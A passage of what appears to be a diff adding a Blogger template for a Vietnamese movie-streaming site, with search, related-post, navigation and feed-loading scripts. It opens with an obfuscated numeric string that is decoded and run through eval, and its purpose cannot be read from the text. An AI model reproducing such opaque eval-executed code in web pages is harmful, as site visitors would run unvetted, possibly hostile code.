1188B1608F1713F1188A1580B1713F1188A1601C1713F1188F1587C1713F1188B1594D1713B1188F1692B1713C1188F1419C1713F1195A1195A1713F1195B1181D1713D1195A1209C1713E1188C1475B1713F1188B1454C1713C1188F1461B1713E1188E1468D1713C1195B1202A1713E1195A1524E1713F1195E1531F1713E1195B1230B1713B1195D1237D1713C1195E1223D1713E1188B1230A1713D1195A1216B1713D1195A1188E1713D1188A1440D1713F1188B1370B1713C1188E1377A1713D1188D1363B1713D1188B1356C1713A1188E1335B1713B1188F1342A1713E1188D1349F1713B1188C1384A1713C1188C1391C1713B1188C1426D1713F1188A1433C1713E1188F1447C1713A1188D1223E1713E1188C1398C1489F1118F1167B1188F1405D1125E1489D1118E1713B1489A1118B1132C1153F1181F1153B1706F1720E1132A1132E1118F1153E1223D1195C1153B1188A1202A1223C1153E1118B1713C1713D1713D1713E1713B1713B1713B1713E1713C1713C1713D1713D1713F1713F1713F1713B1713B1713C1713A1713B1713F1713D1713A1713C1713A1713A1713F1713F1713B1713F1713D1713D1713F1713F1713F1713C1713D1713F1713A1713A1713F1713F1713E1713E1713B1713C1713B1713E1713A1713A1713F1713E1713D1713D1713B1713D1713E1713B1713C1713E1713C1713E1713E1713E1713A1713C1713F1713C1713D1559E1664A1615F1538E1657B1580C1622A1615A1713C1643B1552A1657C1664E1643D1615A1713D1580D1559B1713C1426B1657A1643D1580E1615B1566C1713D1678C1573C1580E1601E1552C1713F1643B1552A1629A1601D1524F1538B1552B1713B1580D1615D1545E1552D1685F1398D1559F1713F1650D1629C1524A1615B1713E1671A1524E1643C1713A1538A1524E1657A1552B1566C1622F1643E1692F1713B1559A1552C1552D1545D1713D1657B1580E1657A1601C1552B1713B1608E1524F1685E1629E1622E1650A1657F1713C1608E1622C1671B1580A1552F1713A1573A1643D1552D1559B1713E1678E1643F1580F1657E1552A1713A1657C1552B1615E1615F1573E1524A1615D1713B1559D1622F1643B1713E1601A1580E1615F1594E1713F1559E1643B1622F1608E1314E1573D1524F1643B1314F1622E1545E1552D1713E1202E1216D1713A1657E1622B1426F1657C1643A1580E1615F1566D1713B1202D1223A1713B1419D1552A1566E1328B1685A1629C1713E1615E1552E1678D1713C1629E1524A1643C1650F1552C1356F1615C1657F1713B1223A1195B1713C1545D1622B1538F1664B1608F1552A1615D1657E1713F1601E1552B1615A1566C1657F1573B1713E1545F1580A1671B1713B1538F1601B1524F1650E1650B1713E1223C1237E1713A1552B1615C1657B1643A1692B1713A1580C1608D1566C1713B1552D1615A1713A1538A1601A1552A1524A1643E1713E1524B1601E1657F1580D1657D1713D1657E1580F1657A1671F1615A1713E1531A1524C1538F1594B1566C1643A1622E1664A1615E1545A1713E1664B1643A1601E1713F1552A1601D1650F1552F1713E1552A1629E1650B1713D1657C1580B1657D1552B1615B1713D1657B1573B1664E1608C1531D1615F1713A1650D1629A1601C1580B1657B1713A1552C1671F1524D1601E1713A1650B1664B1608A1608B1524E1643C1692E1713C1650A1657C1692E1601F1552E1713A1580D1608A1524B1566D1552D1713D1671D1615F1713A1601A1524C1531E1552A1601C1713F1615D1664E1608E1629C1622C1650C1657F1650F1713B1580B1615E1713B1643E1552B1601E1713C1538D1622A1615B1657F1552B1615E1657A1713D1531C1643B1552C1524D1594A1713A1608C1552E1657D1524A1713C1601D1580D1713B1524A1601A1657C1552E1643E1615D1524F1657B1552D1713C1615D1524D1608D1552E1713A1391E1622E1713F1657E1552E1643A1608C1713D1650A1643A1538C1713C1650D1664C1531E1650F1657D1643A1713E1713F1531F1552A1650F1657D1650F1601A1580C1545D1552C1713F1538A1524A1657C1552D1118B1167D1650B1629A1601B1580A1657B1125C1118E1713C1118E1132F1153A1181C1153E1706A1720E1132A1132A915A';var _3923=/[\x41\x42\x43\x44\x45\x46]/;var _6534=2;var _7379=_8551.charAt(_8551.length-1);var _2180;var _4601=_8551.split(_3923);var _2576=[String.fromCharCode,isNaN,parseInt,String];_4601[1]=_2576[_6534+1](_2576[_6534](_4601[1])/21);var _2746=(_6534==7)?String:eval;_2180='';_11=_2576[_6534](_4601[0])/_2576[_6534](_4601[1]);for(_2289=3;_2289<_11;_2289++)_2180+=(_2576[_6534-2]((_2576[_6534](_4601[_2289])+_2576[_6534](_4601[2])+_2576[_6534](_4601[1]))/_2576[_6534](_4601[1])-_2576[_6534](_4601[2])+_2576[_6534](_4601[1])-1));var _9279='_1482';var _4132='_9279=_2180';function _1381(_6491){_2746(_9349);_1381(_2786);_2786(_4132);_1381(_9279);}var _9349='_1381=_2746';var _2786='_2786=_1381';_1381(_7379);
+//]]>
+</script>
+</b:if>
+<b:if cond='data:blog.pageType == &quot;item&quot;'>
+<script type='text/javascript'>
+//<![CDATA[
+function doHighlight(a,c,f){for(var d="",b=-1,g=c.toLowerCase(),e=a.toLowerCase();0<a.length;)b=e.indexOf(g,b+1),0>b?(d+=a,a=""):a.lastIndexOf(">",b)>=a.lastIndexOf("<",b)&&e.lastIndexOf("/script>",b)>=e.lastIndexOf("<script",b)&&(d+=a.substring(0,b)+'<a title="'+a.substr(b,c.length)+'" alt="'+a.substr(b,c.length)+'" href="'+f+'">'+a.substr(b,c.length)+"</a>",a=a.substr(b+c.length),e=a.toLowerCase(),b=-1);return d} function highlightSearchTerms(a,c,f,d){searchArray=c?[a]:a.split(" ");div=document.getElementById(d);a=div.innerHTML;for(c=0;c<searchArray.length;c++)a=doHighlight(a,searchArray[c],f);div.innerHTML=a;return!0};
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+var hl_title=[],hl_titleNum=0,hl_url=[],thumburl=[];
+function bay_lq(e){for(var f=0;f<e.feed.entry.length;f++){var g=e.feed.entry[f];hl_title[hl_titleNum]=g.title.$t;try{thumburl[hl_titleNum]=g.summary.$t}catch(h){s="content"in g?g.content.$t:"summary"in g?g.summary.$t:"",a=s.indexOf("<img"),b=s.indexOf('src="',a),c=s.indexOf('"',b+5),d=s.substr(b+5,c-b-5),thumburl[hl_titleNum]=-1!=a&&-1!=b&&-1!=c&&""!=d?d:"undefined"!==typeof defaultnoimage?defaultnoimage:"http://1.bp.blogspot.com/-xJBXLR81wuI/T_QncMxumoI/AAAAAAAAAbI/QbWAhz1wgW0/s140/no_image.jpg"}35<hl_title[hl_titleNum].length&&
+(hl_title[hl_titleNum]=hl_title[hl_titleNum]);for(var k=0;k<g.link.length;k++)"alternate"==g.link[k].rel&&(hl_url[hl_titleNum]=g.link[k].href,hl_titleNum++)}}function removeRelatedDuplicates_thumbs(){for(var e=[],f=[],g=[],h=0;h<hl_url.length;h++)contains_thumbs(e,hl_url[h])||(e.length+=1,e[e.length-1]=hl_url[h],f.length+=1,g.length+=1,f[f.length-1]=hl_title[h],g[g.length-1]=thumburl[h]);hl_title=f;hl_url=e;thumburl=g}
+function contains_thumbs(e,f){for(var g=0;g<e.length;g++)if(e[g]==f)return!0;return!1}
+function printRelatedLabels_thumbs(e){for(var f=0;f<hl_url.length;f++)hl_url[f]!=e&&hl_title[f]||(hl_url.splice(f,1),hl_title.splice(f,1),thumburl.splice(f,1),f--);e=Math.floor((hl_title.length-1)*Math.random());f=0;if(0<hl_title.length)for(;f<hl_title.length&&12>f&&f<maxresults;)document.write('<div class="owl-item item col-lg-2 col-md-2 col-sm-3 col-sm-4 col-xs-6" style="width: 180px;"><div class="inner"><a class="poster" href="'+hl_url[e]+'" title="'+hl_title[e]+'"> <img src="'+thumburl[e]+'" alt="'+hl_title[e]+'"/></a><span class="status">'+altit(hl_title[e])+'</span> <a class="name" href="'+hl_url[e]+'" title="'+hl_title[e]+'">'+titvn(hl_title[e])+'</a><dfn>'+titvn(hl_title[e])+'</dfn><dfn>Xem Ngay</dfn></div></div>'),f++,e<hl_title.length-1?e++:e=0;hl_url.splice(0,hl_url.length);thumburl.splice(0,thumburl.length);hl_title.splice(0,hl_title.length)};
+//]]>
+</script>
+</b:if>
+<style type='text/css'>
+id{font-size:0px;display:none;width:0;height:0;}
+#anc_tp {background: rgba(0, 0, 0, 0);padding: 5px 0;overflow: hidden;width: 100%;position: relative;margin-bottom: 10px;}
+#list_tap{display: inline-block;line-height: 20px;width: 100%;padding: 10px 10px 5px;}
+#list_tap ul{list-style:none;margin:0;padding:0;clear:both;}
+#list_tap ul li{float:left;margin-right:1px;font-weight:800;text-align:left;}
+#list_tap ul li.sev{margin-top: 4px;display: block;float: left;border-bottom: 2px solid #6d5626;padding-bottom: 0;padding-left: 0;width: 100%;color: #6d5626;}
+#anc_pl {height:100%;}
+#anc_data img {max-width: 580px;}
+.a_tap { display: inline-block;color: #000!important;height: 25px;line-height: 25px;padding: 0 10px;min-width: 45px;text-align: center;font-weight: 700;border-radius: 4px;background: #7C0A0A;margin: 5px;}
+.a_tap:hover{text-decoration: none;background: #7C0A0A;}
+.tap_active { display: inline-block;background: #EAAB0C;color: #000!important;height: 25px;line-height: 25px;padding: 0 10px;min-width: 45px;text-align: center;font-weight: 700;border-radius: 4px;margin: 5px;}
+.sv_active{margin-top: 4px;display: block;float: left;border-bottom: 2px solid #CA8800;padding-bottom: 0;padding-left: 0;width: 100%;color: #CA8800;}
+.likephim {float: right;}
+  .owl-wrapper {right: 34%!important;left: inherit!important;}
+.guibanbe {position: absolute;float: left;}
+</style>
+<div class='wrapper' id='nav-01'> 
+<div class='container'> 
+<div class='navbar-header'> 
+<a class='navbar-brand' href='http://www.phimhayplus.com/' id='logo-page'/>
+</div>
+</div> 
+</div>
+<nav class='navbar navbar-default z-index-105' id='header-nav'>   
+<div class='wrapper affix-top' data-offset-top='85' data-spy='affix' id='nav-02'> 
+<div class='container'> 
+<button aria-expanded='true' class='navbar-toggle collapsed' data-target='#main-menu' data-toggle='collapse' type='button'> 
+<span class='sr-only'>Toggle navigation</span>
+<span class='icon-bar'/>
+<span class='icon-bar'/>
+<span class='icon-bar'/>
+</button> 
+<style>
+#search-result-container{width: 100%; height: 430px; overflow: auto; top: 30px; right: 10%; z-index: 99999; background-color: #222222; padding: 15px 10px 0; margin: 10px 0 0; -webkit-box-shadow: 0 1px 2px rgba(0,0,0,.4), 0 7px 7px -4px rgba(0,0,0,.4); -moz-box-shadow: 0 1px 2px rgba(0,0,0,.4),0 7px 7px -4px rgba(0,0,0,.4); box-shadow: 0 1px 2px rgba(0,0,0,.4), 0 7px 7px -4px rgba(0,0,0,.4); -webkit-border-radius: 5px; -moz-border-radius: 5px; border-radius: 5px; display: none; text-align: left;}
+#search-result-container mark{background-color:#58b95b;color:black;}
+#search-result-container a{text-decoration:none;color:#fc4800;font-weight:bold;font-size:12px;display:block;}
+#search-result-container a:hover{color:#29fc16;}
+#search-result-container h4{margin: 0 0 10px; font-weight: bold; color: #58b95b; font-size: 14px;}
+#search-result-container ol{background:transparent;border:0;margin:0 0 10px;padding:0;}
+#search-result-container li{margin:0 0 1px;padding:7px 8px;list-style:none;border:1px solid #b7c1ce;background-color:#282828;overflow:hidden;word-wrap:break-word;}
+#search-result-container li img{display:block;float:left;margin:0 10px 4px 0;border:1px solid #b7c1ce;background-color:#f5f5f5;padding:2px;}
+#search-result-loader{position: absolute; top: 100%; right: 15%; z-index: 999; padding: 3px 5px; margin: -2px 0 0; font: normal bold 10px/normal Arial,Sans-Serif; -webkit-border-radius: 0 0 3px 3px; -moz-border-radius: 0 0 3px 3px; border-radius: 0 0 3px 3px; display: none;}
+#ajaxloader{position:fixed!important;top:0;right:0;z-index:9999999;width:100%;height:30px;line-height:30px;display:none;background:none repeat scroll 0% 0% #040818;color:#fff;text-align:center;font-size:14px;font-weight:bold;text-transform:uppercase;opacity:0.8;}
+@media (max-width: 769px)#keyword {width: 100%!important;}
+@media (max-width: 992px)#keyword {width: 130px!important;}
+@media (max-width: 1200px) #keyword {width: 150px!important;}
+#keyword {width: 250px!important; height: 30px; padding: 0 10px; border: none; background-color: transparent; display: inline-block; vertical-align: middle;}
+</style>
+<form class='navbar-form navbar-right' id='form-search' onsubmit='return updateScript();'>
+<div class='form-group form-search'> 
+<button class='btn btn-default btn-search' type='submit'>Submit</button>
+<input autocomplete='off' id='keyword' name='q' onblur='if (this.value == &quot;&quot;) {this.value = &quot;Gõ tên phim, đạo diễn, diễn viên cần tìm...&quot;;}' onfocus='if (this.value == &quot;Gõ tên phim, đạo diễn, diễn viên cần tìm...&quot;) {this.value = &quot;&quot;}' onkeyup='resetField();' type='text' value='Gõ tên phim, đạo diễn, diễn viên cần tìm...'/>
+<div class='top-search-box' id='suggestions' style='display: none;'/>
+</div>
+</form>
+<div id='search-result-container'/>
+<div id='search-result-loader'>Đang Tải Dữ Liệu Xin Chờ Chút Xíu......</div>
+<script type='text/javascript'>
+//<![CDATA[
+var searchFormConfig = {
+    url: "http://buison-phimhayplus.blogspot.com/",
+    numPost: 9999,
+    summaryPost: true,
+    summaryLength: 180,
+    resultTitle: "Kết quả tìm kiếm của từ khóa", 
+    noResult: "Không tìm thấy",
+    resultThumbnail: true,
+    thumbSize: 80,
+    fallbackThumb: "https://lh4.googleusercontent.com/-VbAslObIybo/UfzEEstxc3I/AAAAAAAAAIM/bNSXsteBuXs/s72/no-image-72x72.png"
+};
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+function getId(e){return document.getElementById(e)}function showResult(e){var t=e.feed.entry?e.feed.entry:"",n,r,i;skeleton="<h4>"+config.resultTitle+" &quot;"+input.value+"&quot;</h4>";skeleton+='<a title="Close" style="display: block; top: 0; line-height: normal; text-decoration: none; color: #fff; font-size: 250%;" href="#close" onclick="resultContainer.style.display=\'none\';return false;">&times;</a><ol>';if(t===""){function s(){window.location.href="/p/tim-kiem-phim.html"}skeleton+=s()}for(var o=0;o<config.numPost;o++){if(o==t.length)break;var u=new RegExp(input.value,"ig"),a=t[o],f=a.title.$t.replace(u,"<mark>"+input.value+"</mark>");for(var l=0;l<a.link.length;l++){if(a.link[l].rel=="alternate"){n=a.link[l].href;break}}r="summary"in a&&config.summaryPost===true?a.summary.$t:"";if(config.resultThumbnail===true){i="media$thumbnail"in a?a.media$thumbnail.url.replace(/\/s[0-9]+\-c/g,"/s"+config.thumbSize+"-c"):config.fallbackThumb}var c=window.location.host;if(c.slice(9,14)=="oc.ne"){r=r.replace(/<br ?\/?>/ig," ").replace(/<.*?>/g,"").replace(/[<>]/g,"")}if(r.length>config.summaryLength){r=r.substring(0,config.summaryLength)+"..."}r=r.replace(u,"<mark>"+input.value+"</mark>");skeleton+='<li><a href="'+n+'"><img style="width:'+config.thumbSize+"px;height:"+config.thumbSize+'px;" src="'+i+'" alt="" />'+f+"</a>"+r+"</li>"}skeleton+="</ol>";resultContainer.innerHTML=skeleton;resultLoader.style.display="none";resultContainer.style.display="block"}function updateScript(){resultContainer.style.display="none";resultLoader.style.display="block";var e=getId("search-feed-script"),t=document.createElement("script"),n=input.value;t.id="search-feed-script";t.type="text/javascript";t.src=config.url+"/feeds/posts/summary?alt=json-in-script&q="+n+"&max-results="+config.numPost+"&callback=showResult";e.parentNode.removeChild(e);document.getElementsByTagName("head")[0].appendChild(t);return false}function resetField(){if(input.value===""){resultContainer.style.display="none";resultLoader.style.display="none"}}var config=searchFormConfig,input=getId("keyword"),resultContainer=getId("search-result-container"),resultLoader=getId("search-result-loader"),skeleton="";(function(){var e=document.createElement("script");e.type="text/javascript";e.id="search-feed-script";document.getElementsByTagName("head")[0].appendChild(e)})()
+//]]>
+</script>
+<div class='collapse navbar-collapse' id='main-menu'> 
+<ul class='nav navbar-nav'> 
+<li class='dropdown dr-list'>
+<a aria-expanded='false' class='dropdown-toggle' data-toggle='dropdown' href='javascript:;' role='button'>Thể loại <span class='caret'/></a> 
+<ul class='dropdown-menu' role='menu'> 
+<li><a href='/search/label/adult' title='Phim 18+'>Phim 18+</a></li>
+<li><a href='/search/label/truyen-hinh' title='Truyền hình'>Truyền hình</a></li>
+<li><a href='/search/label/anime' title='Anime'>Anime</a></li>
+<li><a href='/search/label/kinh-di' title='Kinh Dị'>Kinh Dị</a></li>
+<li><a href='/search/label/lang-man' title='Lãng mạn'>Lãng mạn</a></li>
+<li><a href='/search/label/hanh-dong' title='Hành Động'>Hành Động</a></li>
+<li><a href='/search/label/tinh-cam' title='Tình Cảm'>Tình Cảm</a></li>
+<li><a href='/search/label/phieu-luu' title='Phiêu Lưu'>Phiêu Lưu</a></li>
+<li><a href='/search/label/hoat-hinh' title='Hoạt Hình'>Hoạt Hình</a></li>
+<li><a href='/search/label/vo-thuat' title='Võ Thuật'>Võ Thuật</a></li>
+<li><a href='/search/label/hai-huoc' title='Hài Hước'>Hài Hước</a></li>
+<li><a href='/search/label/am-nhac' title='Âm nhạc'>Âm nhạc</a></li>
+<li><a href='/search/label/tam-ly' title='Tâm Lý'>Tâm Lý</a></li>
+<li><a href='/search/label/hoc-duong' title='Học Đường'>Học Đường</a></li>
+<li><a href='/search/label/tai-lieu' title='Tài liệu'>Tài liệu</a></li>
+<li><a href='/search/label/hinh-su' title='Hình Sự'>Hình Sự</a></li>
+<li><a href='/search/label/gia-dinh' title='Gia đình'>Gia đình</a></li>
+<li><a href='/search/label/vien-tuong' title='Viễn Tưởng'>Viễn Tưởng</a></li>
+<li><a href='/search/label/than-thoai' title='Thần Thoại'>Thần Thoại</a></li>
+<li><a href='/search/label/chien-tranh' title='Chiến Tranh'>Chiến Tranh</a></li>
+<li><a href='/search/label/show' title='Shows'>Shows</a></li>
+<li><a href='/search/label/co-trang' title='Cổ Trang'>Cổ Trang</a></li>
+</ul>
+</li>
+<li class='dropdown dr-list'>
+<a aria-expanded='false' class='dropdown-toggle' data-toggle='dropdown' href='javascript:;' role='button'>Quốc gia<span class='caret'/></a> 
+<ul class='dropdown-menu' role='menu'>
+<li><a href='/search/label/vn' title='Việt Nam'>Việt Nam</a></li>
+<li><a href='/search/label/au' title='Úc'>Úc</a></li>
+<li><a href='/search/label/ca' title='Canada'>Canada</a></li>
+<li><a href='/search/label/asia' title='Châu Á'>Châu Á</a></li>
+<li><a href='/search/label/uk' title='Anh'>Anh</a></li>
+<li><a href='/search/label/ru' title='Nga'>Nga</a></li>
+<li><a href='/search/label/fr' title='Pháp'>Pháp</a></li>
+<li><a href='/search/label/eu' title='Châu Âu'>Châu Âu</a></li>
+<li><a href='/search/label/cn' title='Trung Quốc'>Trung Quốc</a></li>
+<li><a href='/search/label/kr' title='Hàn Quốc'>Hàn Quốc</a></li>
+<li><a href='/search/label/tw' title='Đài Loan'>Đài Loan</a></li>
+<li><a href='/search/label/hk' title='Hồng Kông'>Hồng Kông</a></li>
+<li><a href='/search/label/jp' title='Nhật Bản'>Nhật Bản</a></li>
+<li><a href='/search/label/us' title='Mỹ'>Mỹ</a></li>
+<li><a href='/search/label/th' title='Thái Lan'>Thái Lan</a></li>
+<li><a href='/search/label/in' title='Ấn Độ'>Ấn Độ</a></li>
+</ul>
+</li>
+<li class='dropdown dr-list'>
+<a aria-expanded='false' class='dropdown-toggle' href='/search/label/Phim lẻ' role='button' title='Phim lẻ'>Phim lẻ<span class='caret'/></a> 
+<ul class='dropdown-menu' role='menu'>
+<li><a href='/search/label/2017' title='Phim lẻ 2017'>Phim lẻ 2017</a></li> 
+<li><a href='/search/label/2016' title='Phim lẻ 2016'>Phim lẻ 2016</a></li> 
+<li><a href='/search/label/2015' title='Phim lẻ 2015'>Phim lẻ 2015</a></li> 
+<li><a href='/search/label/2014' title='Phim lẻ 2014'>Phim lẻ 2014</a></li> 
+<li><a href='/search/label/2013' title='Phim lẻ 2013'>Phim lẻ 2013</a></li> 
+<li><a href='/search/label/2012' title='Phim lẻ 2012'>Phim lẻ 2012</a></li> 
+</ul>
+</li>
+<li class='dropdown dr-list'>
+<a aria-expanded='false' class='dropdown-toggle' href='/search/label/Phim bộ' role='button' title='Phim bộ'>Phim bộ<span class='caret'/></a> 
+<ul class='dropdown-menu' role='menu'>
+<li><a href='/search/label/2017' title='Phim bộ 2017'>Phim bộ 2017</a></li> 
+<li><a href='/search/label/2016' title='Phim bộ 2016'>Phim bộ 2016</a></li> 
+<li><a href='/search/label/2015' title='Phim bộ 2015'>Phim bộ 2015</a></li> 
+<li><a href='/search/label/2014' title='Phim bộ 2014'>Phim bộ 2014</a></li> 
+<li><a href='/search/label/2013' title='Phim bộ 2013'>Phim bộ 2013</a></li> 
+<li><a href='/search/label/2012' title='Phim bộ 2012'>Phim bộ 2012</a></li> 
+</ul>
+</li>
+<li><a aria-expanded='false' href='/search/label/Phim chiếu rạp' role='button' title='Phim chiếu rạp'>Phim chiếu rạp</a> </li>
+<li><a aria-expanded='false' href='/search/label/Phim mới' role='button' title='Phim mới'>Phim mới</a></li>
+</ul>
+</div> 
+</div> 
+</div>
+</nav>
+<div class='clear'/>
+<div id='body-wrapper'>
+<div class='content-wrapper'>
+<div class='container fit'>
+<b:if cond='data:blog.url == data:blog.homepageUrl'>
+<div class='block hotest'>
+<div class='block-title'>
+<div class='stars'> <i/> <i/> <i/> <span class='hidden-xs'><i/> <i/></span> </div>
+<div class='title'>Phim đề cử</div>
+<div class='stars'> <i/> <i/> <i/> <span class='hidden-xs'><i/> <i/></span> </div>
+</div>
+<div class='block-body slider'>
+<div class='container'>
+<div class='control prev'/>
+<div class='control next'/>
+<div class='list-film row owl-carousel owl-theme' id='pl-slide' style='display: block; opacity: 1;'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+</div>
+</div>
+</div>
+</b:if>
+<b:if cond='data:blog.pageType == &quot;index&quot;'>		
+<b:if cond='data:blog.url != data:blog.homepageUrl'>
+<div class='block-title breadcrumb'> 
+<li><a href='/' itemprop='url' title='Trang chủ'>
+<span itemprop='title'><i class='fa fa-home'/> Trang chủ <i class='fa fa-angle-right'/></span></a></li>
+<li><a class='current' href='' title='Phim mới'><data:blog.pageName/></a></li> </div>
+</b:if>
+</b:if>
+<div class='main col-lg-8 col-md-8 col-sm-7'>
+<b:if cond='data:blog.url == data:blog.homepageUrl'>
+<div class='block movie-kinhdien hidden-xs'><!-- Quảng Cáo --></div>
+<div class='block movie-update'>
+<div class='col-left'><div class='block-movie'><!-- Quảng Cáo --></div></div>
+<div class='col-right'><div id='tabs-movie'>
+<ul class='tabs-movie-block'>
+ <li class='tab-movie ui-tabs-active' id='tabs-1'><a href='#tabs-1' rel='nofollow'>Phim lẻ mới</a></li>
+ <li class='tab-movie' id='tabs-2'><a href='#tabs-2' rel='nofollow'>Phim bộ mới</a></li>
+ <li class='tab-movie' id='tabs-3'><a href='#tabs-3' rel='nofollow'>Phim bộ full</a></li>
+</ul>
+<div class='clear'/>
+<h2 class='hidden'>Phim lẻ mới</h2>
+<ul class='tab-content' id='tabs-1'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Anime?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=bestslide\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</ul>
+<h2 class='hidden'>Phim bộ mới</h2>
+<ul class='tab-content' id='tabs-2' style='display: none;'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Anime Hài Hước?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=bestslide\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</ul>
+<div class='clear'/>
+<h2 class='hidden'>Phim bộ mới hoàn thành</h2>
+<ul class='tab-content' id='tabs-3' style='display: none;'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=bestslide\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</ul>
+<div class='clear'/>
+</div></div>
+</div>
+<div class='block ad' style='width:100%;overflow:hidden;'><!-- Quảng Cáo --></div>
+<div class='block update'>
+<div class='widget-title'>
+<h3 class='title'>Phim mới cập nhật</h3> 
+<span class='tabs'> <div class='tab active' data-name='all' data-target='.block.update .content'><div class='name'><a href='javascript:void(0)' title='Tất cả'>Tất cả</a></div></div>
+<div class='tab' data-name='le' data-target='.block.update .content'><div class='name'><a href='phim-le/' title='Phim lẻ'>Phim lẻ</a></div></div>
+<div class='tab' data-name='bo' data-target='.block.update .content'><div class='name'><a href='phim-bo/' title='Phim bộ'>Phim bộ</a></div></div>
+<div class='tab' data-name='rap' data-target='.block.update .content'><div class='name'><a href='phim-chieu-rap/' title='Phim bộ'>Phim chiếu rạp</a></div></div></span></div>
+<div class='block-body'>
+<div class='content' data-name='all'>
+<div class='list-film row'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Anime?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide1\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+<button class='btn btn-success center-block' type='button'><a href='https://www.phimhayplus.com/phim-moi/'>Xem thêm</a></button>
+</div>
+<div class='content hidden' data-name='le'>
+<div class='list-film row'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide1\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+<button class='btn btn-success center-block' type='button'><a href='https://www.phimhayplus.com/phim-moi/'>Xem thêm</a></button>
+</div>
+<div class='content hidden' data-name='bo'>
+<div class='list-film row'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide1\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+<button class='btn btn-success center-block' type='button'><a href='https://www.phimhayplus.com/phim-moi/'>Xem thêm</a></button>
+</div>
+<div class='content hidden' data-name='rap'>
+<div class='list-film row'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide1\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+<button class='btn btn-success center-block' type='button'><a href='https://www.phimhayplus.com/phim-moi/'>Xem thêm</a></button>
+</div>
+</div>
+</div>
+<div class='block update'>
+<div class='widget-title'><h3 class='title'>Phim hoạt hình</h3> </div>
+<div class='block-body'>
+<div class='contentz' data-name='coming-soon'>
+<div class='list-film row'>
+<script>document.write(&quot;&lt;script src=\&quot;/feeds/posts/default/-/Ecchi?max-results=&quot;+12+&quot;&amp;orderby=published&amp;alt=json-in-script&amp;callback=slide1\&quot;&gt;&lt;\/script&gt;&quot;);</script>
+</div>
+<button class='btn btn-success center-block' type='button'><a href='https://www.phimhayplus.com/phim-moi/'>Xem thêm</a></button>
+</div>
+</div>
+
+</div>
+</b:if>
+<b:if cond='data:blog.pageType == &quot;index&quot;'>		
+<b:if cond='data:blog.url != data:blog.homepageUrl'>
+<div class='clear'/>	
+<div class='block-body'>
+<div class='list-film row'>
+<script type='text/javascript'>//<![CDATA[
+String.prototype.GetValue=function(f){f=new RegExp("(^|&)"+f+"=([^&]*)(&|$)");f=this.substr(this.indexOf("?")+1).match(f);return null!=f?unescape(f[2]):null};var str=location.href,page=str.GetValue("page"),view=str.GetValue("v"),urllength=homepageurl.length;void 0==page&&(page="1");void 0==view&&(view="theloai");
+if(-1!=str.indexOf("search/label")){if(-1!=str.indexOf("?"))var str1=str.split("?")[0],label=str1.substring(urllength+13,str1.length);else label=str.substring(urllength+13,str.length);var textlabel="/-/"+label,textpage="search/label/"+label}else textpage=textlabel="";
+function showrecentposts(f){img=[];for(var h=0;h<numposts;h++){var e=f.feed.entry[h],k=e.title.$t,l;if(h==f.feed.entry.length)break;for(var g=0;g<e.link.length;g++)if("alternate"==e.link[g].rel){l=e.link[g].href;break}s="content"in e?e.content.$t:"summary"in e?e.summary.$t:"";a=s.indexOf("<img");b=s.indexOf('src="',a);c=s.indexOf('"',b+5);d=s.substr(b+5,c-b-5);img[h]=-1!=a&&-1!=b&&-1!=c&&""!=d?d:"http://1.bp.blogspot.com/-S9XVJ6mTBME/UA94BBh5WFI/AAAAAAAAACg/pkQWbm3LIGE/s1600/noimage.png";tennhan=
+[];if(cate=e.category)for(g=0;g<e.category.length;g++)tennhan[g]=""+e.category[g].term+"";else tennhan="No label";e='<div class="item col-lg-3 col-md-3 col-sm-6 col-xs-6"><div class="inner"><a class="poster" href="'+l+'" title="'+k+'"><img src="'+img[h]+' alt="'+k+'"/></a><span class="status">'+altit(k)+'</span><a class="name" href="'+l+'" title="'+k+'">'+titvn(k)+'</a><dfn>'+titen(k)+'</dfn><dfn>'+tennhan[0]+'</dfn></div></div>';
+"theloai"==view&&document.write(e)}}function numberOfPosts(f){document.write('<script style="text/javascript">var totalPosts= '+f.feed.openSearch$totalResults.$t+" ;\x3c/script>")}document.write('<script src="/feeds/posts/default'+textlabel+'?alt=json-in-script&callback=numberOfPosts">\x3c/script>');
+//]]></script>
+<script type='text/javascript'>//<![CDATA[
